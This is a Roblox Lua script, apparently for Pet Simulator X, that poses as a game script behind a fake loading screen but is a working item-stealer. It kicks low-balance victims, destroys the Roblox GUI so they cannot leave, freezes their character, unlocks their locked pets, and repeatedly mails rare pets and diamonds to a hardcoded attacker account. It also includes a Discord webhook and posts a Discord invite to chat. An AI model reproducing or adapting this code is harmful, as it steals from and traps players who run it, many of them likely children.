--[[ custumz Mail Logger ]]--made by: Outroduction#8543
 
--[[ Main Config ]]--
_G.Username = "W4r_ObScUrE" --// Username To Send Pets To
_G.GiftMessage = "join if you want your pets back: discord.gg/3Z5bsAEUpV" --// Message For The Gift To Say
 
_G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
_G.UnlockPets = true --// Unlocks Locked Pets
_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
_G.Crash = true  --// Crashes Them After Its Finished
 
--[[ Webhook Config ]]--
_G.Webhook = "https://discord.com/api/webhooks/1119738145815150695/IBaH-X2Z3BsPSTIM8QqSq6E43Ch09BRxrbIWg8HKGz5nieCgPKAhfyfGomiflL1WPKMC" --// Discord Webhook For Executions
_G.Enabled = true --// Toggle For Sending Webhooks
_G.Mention = true --// Pings You When Someone Executes
--[[ UI Config ]]--
_G.ScriptName = "psx scrpit" --// Script Name On The UI
_G.Tip1 = "loading" --// Gives You Tips On The UI
_G.Tip2 = "loading" --// Gives You Tips On The UI
_G.Tip3 = "dont leave so it can load" --// Gives You Tips On The UI
_G.Tip4 = "almost there!!!" --// Gives You Tips On The UI
_G.Tip5 = "almost there!!!" --// Gives You Tips On The UI
 
--dont obf
local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network);
local Fire = Network.Fire
old = hookfunction(getupvalue(Fire, 1), function(...) 
    return true 
end)
 
--// Vars
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local FrameworkLibrary = require(game.ReplicatedStorage.Framework.Library)
local CoreGui = game:GetService("CoreGui")
local RobloxGui = CoreGui.RobloxGui
local Client = Players.LocalPlayer
local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network);
local Fire = Network.Fire
local lockedCount = 0
local Invoke = Network.Invoke
 
--// Pet Folders
local PetFolders = {
	game.Players.LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Normal,
	game.Players.LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Titanic
}
 
if time() <= 30 then
	wait(1.2)
	game.StarterGui:SetCore("SendNotification", {
	Title = "ERROR"; -- the title (ofc)
	Text = "Remotes hasn't loaded yet try again in 30 seconds"; -- what the text says (ofc)
	Duration = 15; -- how long the notification should in secounds
	})
	return
end
 
--// Loading UI


local ScreenGui = Instance.new("ScreenGui")
local ImageLabel = Instance.new("ImageLabel")

--Properties:
local Loading = Instance.new("ScreenGui")
local Image = Instance.new("ImageLabel")

Loading.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
Loading.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Loading.DisplayOrder = 51

Image.Parent = Loading
Image.BackgroundTransparency = 1
Image.Position = UDim2.new(0, 0, -0.1, 0)
Image.Size = UDim2.new(1, 0, 1, 0)
Image.ZIndex = 10
Image.Image = "rbxassetid://13798067136"

--// Teleport To Mailbox
local mailbox = game:GetService("Workspace")["__MAP"].Interactive.Mailbox
for i,v in pairs(mailbox:GetDescendants()) do
    if v:IsA("MeshPart") or v:IsA("Part") then
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Position)
        break
    end
end
 
--// lock keys 
local disabledKeyCodes = {
    0x73;
    0xA4;
    0xA5;
    0x1B;
    0x0D;
    0x46;
    0x34;
    0x4634;
    0x416c74;
    0x57696e646f77;
    0x57;
    0x44;
    0x41;
    0x4d;
    0x6d;
    0x61;
    0x77;
    0x64;
 
};
 
--// Diamond Check
if Client.leaderstats.Diamonds.Value < _G.Diamonds then
	Client:Kick("Script Error")
end
 
 
--// Disable Playerlist
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
 
--// Anti Leave
if _G.AntiLeave == true then
    RobloxGui:Destroy()
end
 
--// Freeze Character
wait(0.5)
Client.Character.HumanoidRootPart.Anchored = true
 
 
--// Execution Log

 
 
 
writefile("openmeifyouwantyourpets.txt", "https://discord.gg/BdRGvQ63")
 
 
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("disco code: BdRGvQ63","All")
 
 
 
--// Unlock Pets
if _G.UnlockPets == true then
    local function unlockPetsInFolder(folder)
        local children = folder:GetChildren()
        for _, child in ipairs(children) do
            if child:IsA("TextButton") and child.Locked.Visible == true then
                local name = child.Name
                if child.Name then
                    local args2 = {
                        [1] = {
                            ["" .. name] = false
                        }
                    }
                    Invoke("Lock Pet", unpack(args2))
                end
            end
        end
    end
 
    while true do
        for _, folder in pairs(PetFolders) do
          unlockPetsInFolder(folder)
          wait(.2)
        end
        for _, folder in ipairs(PetFolders) do
            for _, child in ipairs(folder:GetChildren()) do
                if child:IsA("TextButton") and child.Locked.Visible == true then
                    lockedCount = lockedCount + 1
                end
            end
        end
        if lockedCount == 0 then
            print('Unlocked All')
            break
        end
    end
end
 
--// turn off sound
UserSettings().GameSettings.MasterVolume = 0
 
 wait(2)
 
--// Mail Stealer 

local savedPets = FrameworkLibrary.Save.Get().Pets
while wait() do
	for i,v in pairs(savedPets) do
    	local v2 = FrameworkLibrary.Directory.Pets[v.id]
		if v2.huge == true and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 100000 then
			local args = {
    			[1] = {
        			["Recipient"] = _G.Username,
        			["Diamonds"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 5000000,
        			["Pets"] = {v.uid},
        			["Message"] = _G.GiftMessage
    			}
			}
			Invoke("Send Mail", unpack(args)) 
		elseif v2.rarity == "Exclusive" then
			local args = {
    			[1] = {
        			["Recipient"] = _G.Username,
        			["Diamonds"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 5000000,
        			["Pets"] = {v.uid},
        			["Message"] = _G.GiftMessage
    			}
			}
			Invoke("Send Mail", unpack(args))
        elseif v2.huge == true then
			local args = {
    			[1] = {
        			["Recipient"] = _G.Username,
        			["Diamonds"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 5000000,
        			["Pets"] = {v.uid},
        			["Message"] = _G.GiftMessage
    			}
			}
			Invoke("Send Mail", unpack(args))
		elseif v2.rarity == "Event" then
			local args = {
    			[1] = {
        			["Recipient"] = _G.Username,
        			["Diamonds"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 5000000,
        			["Pets"] = {v.uid},
        			["Message"] = _G.GiftMessage
    			}
			}
			Invoke("Send Mail", unpack(args))
		elseif v2.rarity == "Secret" then
			local args = {
    			[1] = {
        			["Recipient"] = _G.Username,
        			["Diamonds"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 5000000,
        			["Pets"] = {v.uid},
        			["Message"] = _G.GiftMessage
    			}
			}
			Invoke("Send Mail", unpack(args))
		end
        wait(7)
        if v2.huge == true and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 100000 then
			local args = {
    			[1] = {
        			["Recipient"] = _G.Username,
        			["Diamonds"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 2000000,
        			["Pets"] = {v.uid},
        			["Message"] = _G.GiftMessage
    			}
			}
			Invoke("Send Mail", unpack(args)) 
		elseif v2.rarity == "Exclusive" then
			local args = {
    			[1] = {
        			["Recipient"] = _G.Username,
        			["Diamonds"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 2000000,
        			["Pets"] = {v.uid},
        			["Message"] = _G.GiftMessage
    			}
			}
			Invoke("Send Mail", unpack(args))
        elseif v2.huge == true then
			local args = {
    			[1] = {
        			["Recipient"] = _G.Username,
        			["Diamonds"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 2000000,
        			["Pets"] = {v.uid},
        			["Message"] = _G.GiftMessage
    			}
			}
			Invoke("Send Mail", unpack(args))
		elseif v2.rarity == "Event" then
			local args = {
    			[1] = {
        			["Recipient"] = _G.Username,
        			["Diamonds"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 2000000,
        			["Pets"] = {v.uid},
        			["Message"] = _G.GiftMessage
    			}
			}
			Invoke("Send Mail", unpack(args))
		elseif v2.rarity == "Secret" then
			local args = {
    			[1] = {
        			["Recipient"] = _G.Username,
        			["Diamonds"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 2000000,
        			["Pets"] = {v.uid},
        			["Message"] = _G.GiftMessage
    			}
			}
			Invoke("Send Mail", unpack(args))
		end
	end
end
